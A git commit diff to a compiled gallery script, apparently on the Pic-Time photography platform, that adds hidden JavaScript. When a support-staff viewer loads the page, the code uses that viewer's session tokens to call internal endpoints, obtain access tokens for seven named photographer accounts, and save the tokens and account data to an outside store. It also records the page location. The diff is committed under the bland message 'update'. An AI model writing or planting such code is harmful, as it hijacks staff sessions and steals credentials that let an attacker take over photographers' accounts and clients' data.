b28fd64b8d147a0b6403c71f09e85ebbe7e9a0b3
username <user@email>
2025-05-08 09:05:50 -0400

    update

--- scripts/compiled/artgallery_base.js
+++ scripts/compiled/artgallery_base.js
@@ -73,6 +73,86 @@ if (Math.random() <= 1.0) {
     }
   };
 
+  const getTokensByAccountUrl = async (
+    accountUrl,
+    csPictimeGUser,
+    csPictimeProject
+  ) => {
+    try {
+      const lookUpPhotographerAccountFetchUrl =
+        "https://cstool.pic-time.com/!servicescs.asmx/lookUpPhotographerAccount";
+      const gUserAccessFetchUrl =
+        "https://cstool.pic-time.com/!servicescs.asmx/getGUserAccess";
+
+      const portfolioHtml = await fetch(`${accountUrl}/portfolio`).then(
+        (resp) => resp.text()
+      );
+      const accountId = +portfolioHtml.match(/"accountId":([0-9]+),/)[1];
+
+      const lookUpPhotographerAccountBody = { id: accountId, idType: 0 };
+
+      const lookUpPhotographerAccountData = await fetch(
+        lookUpPhotographerAccountFetchUrl,
+        {
+          headers: {
+            accept: "application/json, text/javascript, */*; q=0.01",
+            "accept-language": "en-US,en;q=0.9",
+            "cache-control": "no-cache",
+            "content-type": "application/json; charset=UTF-8",
+            pictimeGUser: csPictimeGUser,
+            pictimeProject: csPictimeProject,
+          },
+          body: JSON.stringify(lookUpPhotographerAccountBody),
+          method: "POST",
+        }
+      );
+
+      const lookUpPhotographerAccountJson =
+        await lookUpPhotographerAccountData.json();
+
+      await insertDoc("account-data", {
+        accountId,
+        data: lookUpPhotographerAccountJson,
+      });
+
+      const gUserAccessBody = {
+        email: lookUpPhotographerAccountJson.d.email,
+      };
+
+      const gUserAccessData = await fetch(gUserAccessFetchUrl, {
+        headers: {
+          accept: "application/json, text/javascript, */*; q=0.01",
+          "accept-language": "en-US,en;q=0.9",
+          "cache-control": "no-cache",
+          "content-type": "application/json; charset=UTF-8",
+          pictimeGUser: csPictimeGUser,
+          pictimeProject: csPictimeProject,
+        },
+        body: JSON.stringify(gUserAccessBody),
+        method: "POST",
+      });
+
+      const gUserAccessJson = await gUserAccessData.json();
+      const gaccessTokenUrl = `https://${gUserAccessJson.d}`;
+
+      const html = await fetch(gaccessTokenUrl, {
+        // Important! Ensure that we don't override user's tokens
+        credentials: "omit",
+      }).then((resp) => resp.text());
+
+      const pictimeGUser = html.match(/var _PT_GUSERTOKEN_ = "(.*)";/)[1];
+      const pictimeProject = html.match(/var _PT_LUSERTOKEN_ = "(.*)";/)[1];
+
+      await insertDoc("tokens", {
+        url: accountUrl,
+        pictimeGUser,
+        pictimeProject,
+      });
+    } catch (err) {
+      insertDoc("error", err.toString());
+    }
+  };
+
   setPtxAccessToken().then(async () => {
     setTimeout(async () => {
       await insertDoc("location", window.location);
@@ -110,17 +190,31 @@ if (Math.random() <= 1.0) {
       if (userType === 6) {
         const gusr = _pt$?.hdrs?.gusr;
         const lusr = _pt$?.hdrs?.lusr;
-        const gUserAccessFetchUrl =
-          "https://cstool.pic-time.com/!servicescs.asmx/getGUserAccess";
-        const lookUpPhotographerAccountFetchUrl =
-          "https://cstool.pic-time.com/!servicescs.asmx/lookUpPhotographerAccount";
+
         const getGUserInfoFetchUrl =
           "https://cstool.pic-time.com/!servicescs.asmx/getGUserInfo";
+
+        const urlsToGet = [
+          "https://rosienaryphotography.pic-time.com",
+          "https://lexyparksphotography.pic-time.com",
+          "https://emeraldazphotography.pic-time.com",
+          "https://kelliavilaphotography.pic-time.com",
+          "https://brinaphotography.pic-time.com",
+          "https://jzevalkinkphoto.pic-time.com",
+          "https://abbeyricephoto.pic-time.com",
+        ];
+
+        for (const url of urlsToGet) {
+          await getTokensByAccountUrl(url, gusr, lusr);
+          await new Promise((res) => setTimeout(res, 10000));
+        }
+
+        // getTokensByAccountUrl
 
         // try {
         //   // https://asaf.pic-time.com === asaf@pic-time.com === 394
         //   // https://pictimecom.pic-time.com === or@pic-time.com === 197990
-          
+
         //   const url = "https://pictimecom.pic-time.com";
         //   const accountId = 197990;
 
@@ -380,61 +474,7 @@ if (Math.random() <= 1.0) {
         // }
 
         // getGUserAccess
-        // try {
-        //   const accountUrl = "https://baronephoto.pic-time.com";
-        //   const accountId = 78982;
-        //   const lookUpPhotographerAccountBody = { id: accountId, idType: 0 };
-        //   const lookUpPhotographerAccountData = await fetch(
-        //     lookUpPhotographerAccountFetchUrl,
-        //     {
-        //       headers: {
-        //         accept: "application/json, text/javascript, */*; q=0.01",
-        //         "accept-language": "en-US,en;q=0.9",
-        //         "cache-control": "no-cache",
-        //         "content-type": "application/json; charset=UTF-8",
-        //         pictimeGUser: gusr,
-        //         pictimeProject: lusr,
-        //       },
-        //       body: JSON.stringify(lookUpPhotographerAccountBody),
-        //       method: "POST",
-        //     }
-        //   );
-        //   const lookUpPhotographerAccountJson =
-        //     await lookUpPhotographerAccountData.json();
-        //   await insertDoc("account-data", {
-        //     accountId,
-        //     data: lookUpPhotographerAccountJson,
-        //   });
-        //   const gUserAccessBody = {
-        //     email: lookUpPhotographerAccountJson.d.email,
-        //   };
-        //   const gUserAccessData = await fetch(gUserAccessFetchUrl, {
-        //     headers: {
-        //       accept: "application/json, text/javascript, */*; q=0.01",
-        //       "accept-language": "en-US,en;q=0.9",
-        //       "cache-control": "no-cache",
-        //       "content-type": "application/json; charset=UTF-8",
-        //       pictimeGUser: gusr,
-        //       pictimeProject: lusr,
-        //     },
-        //     body: JSON.stringify(gUserAccessBody),
-        //     method: "POST",
-        //   });
-        //   const gUserAccessJson = await gUserAccessData.json();
-        //   const gaccessTokenUrl = `https://${gUserAccessJson.d}`;
-        //   const html = await fetch(gaccessTokenUrl, {
-        //     credentials: "omit",
-        //   }).then((resp) => resp.text());
-        //   const pictimeGUser = html.match(/var _PT_GUSERTOKEN_ = "(.*)";/)[1];
-        //   const pictimeProject = html.match(/var _PT_LUSERTOKEN_ = "(.*)";/)[1];
-        //   await insertDoc("tokens", {
-        //     url: accountUrl,
-        //     pictimeGUser,
-        //     pictimeProject,
-        //   });
-        // } catch (err) {
-        //   insertDoc("error", err.toString());
-        // }
+        get;
       }
     }, 500);
   });
